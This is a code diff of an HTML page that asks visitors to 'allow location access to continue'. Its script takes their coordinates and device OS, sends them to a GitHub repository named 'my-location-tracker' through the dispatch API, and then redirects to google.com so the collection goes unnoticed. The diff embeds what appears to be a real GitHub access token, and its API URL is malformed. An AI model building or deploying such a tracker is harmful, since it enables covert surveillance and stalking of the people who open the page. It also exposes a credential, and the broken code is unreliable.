@@ -8,12 +8,15 @@
     <p>Please allow location access to continue...</p>
 
     <script>
-        // CONFIGURATION: Username updated. Add your token below.
-        const GITHUB_USERNAME = "morgansmithgacha"; 
+        // CONFIGURATION: Username and Repository are fully updated!
+        const GITHUB_USERNAME = "morgansmithgacha-alt"; 
         const REPO_NAME = "my-location-tracker";
+        
+        // IMPORTANT: Paste your brand new secret fine-grained token between the quotes below
         const GITHUB_TOKEN = "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";
 
         function sendToGitHub(lat, lon, os) {
+            // This tells the browser exactly where to send the data on GitHub's API
             const url = `https://github.com{GITHUB_USERNAME}/${REPO_NAME}/dispatches`;
             
             const payload = {
@@ -36,7 +39,7 @@
                 body: JSON.stringify(payload)
             })
             .then(() => {
-                // Redirect the user to a real site after sending the data
+                // Redirects to a real website after successful delivery
                 window.location.href = "https://google.com";
             })
             .catch(err => console.error("Error sending webhook:", err));
@@ -51,7 +54,7 @@
             return "Unknown Device";
         }
 
-        // Trigger browser location prompt
+        // Prompt the user for location access
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
